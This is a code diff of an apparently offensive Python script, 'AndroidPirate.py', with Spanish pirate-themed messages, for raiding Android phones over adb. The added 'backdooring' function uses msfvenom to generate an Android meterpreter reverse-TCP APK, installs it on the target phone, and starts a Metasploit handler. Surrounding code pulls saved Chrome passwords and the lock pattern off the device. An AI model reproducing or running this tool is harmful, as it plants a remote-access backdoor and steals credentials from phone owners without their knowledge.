@@ -78,7 +78,7 @@ def grab_pattern_from_phone():
     except:
         print("Arrg... parece ser que no tiene el patron activado o no encontramos cual es su conbinacion ARRGGG!!")
         pass
-	
+    
 def grab_chrome_from_phone():
     #pillar contrasenas chrome
     os.system('''adb pull "/data/data/com.android.chrome/app_chrome/Default/Login Data" dump''')
@@ -92,8 +92,67 @@ def grab_chrome_from_phone():
             print str(row).encode('utf-8')
     con.close()
 
+def backdooring():
+    '''
+        Method to create a payload in msfvenom in apk format,
+        then we will install with adb in target mobile phone 
+    '''
+    #primero miramos que tenga el directorio creado
+    print '[+] AARRRRGGG marinero de agua dulce, vamos a dejarle un regalito'
+    if not os.path.exists('PAYLOADS'):
+        print '[+] Not folder of name: PAYLOADS creating, wait a moment...'
+        os.makedirs('PAYLOADS')
+        time.sleep(2)
+    #ahora enseniamos un "prompt" para recoger la informacion
+    print '[+] Para empezar grumete dime en que Host y en que puerto esperaras'
+    LPORT = -1
+    LHOST = ''
+    while LPORT == -1 and LHOST == '':
+        LPORT = int(raw_input('LPORT\t>> '))
+        LHOST = raw_input('LHOST\t>> ')
+        if LPORT<0 or LPORT>65535:
+            LPORT = ''
+    LPORT = str(LPORT)
+    aux = raw_input('[+] Dime grumete es esta tu IP?:<Y/N>')
+    aux = aux.lower()
 
-	
+    print '[+] Ideando el plan de abordaje...'
+    msfvenomStatement = 'msfvenom --payload android/meterpreter/reverse_tcp LHOST=%s LPORT=%s > PAYLOADS/botin.apk' % (LHOST,LPORT)
+    os.system(msfvenomStatement)
+
+    print '[+] Al abordajeeeee...'
+    adbStatement = 'adb install PAYLOADS/botin.apk'
+    os.system(adbStatement)
+
+    if aux =='y':
+        configFile = open('meta.rc','w')
+        setupHandler(configFile,LHOST,LPORT)
+        terminalMetasploit()
+        #os.system('/usr/bin/msfconsole -r meta.rc')
+   
+def setupHandler(configFile, lhost, lport):
+    '''
+        Metodo para crear un archivo con el que arrancar metasploit
+    '''
+    configFile.write('use exploit/multi/handler\n')
+    configFile.write('set PAYLOAD android/meterpreter/reverse_tcp\n')
+    configFile.write('set LPORT '+str(lport)+'\n')
+    configFile.write('set LHOST '+str(lhost)+'\n')
+    configFile.write('exploit -j -z\n')
+    configFile.write('setg DisablePayloadHandler 1\n')  
+
+def terminalMetasploit():
+    '''
+        Para abrir una terminal con metasploit
+
+    '''
+    ruta=os.getcwd()
+    print 'Starting Metasploit server NOW'
+    os.chdir(ruta)
+    orden1 = 'gnome-terminal -e "msfconsole -r meta.rc"'
+    os.system(orden1)
+
+    
 def main():
     help = '''
         ./AndroidPirate.py -a -c -p -w <TWRP_backup_para_tu_modelo_de_movil.iso>
@@ -104,16 +163,18 @@ def main():
         -p:     Sacar patron bloqueo
         -c:     Sacar contrasenias Chrome
         Ejemplo:    ./AndoridPirate.py -a -m -p /TWRP/TWRPbackup_nexus.iso
-	'''
+    '''
     if sys.argv[1] == '-a':
         grab_tresure_from_phone()
         for index in range(len(sys.argv)):
             if sys.argv[index] == '-c':
-			    grab_chrome_from_phone()
+                grab_chrome_from_phone()
             if sys.argv[index] == '-p':
                 grab_pattern_from_phone()
             if sys.argv[index] == '-w':
                 grab_whatssap_from_phone()
+            if sys.argv[index] == '-m':
+                backdooring()
         reboot_phone()
     else:
         print(help)
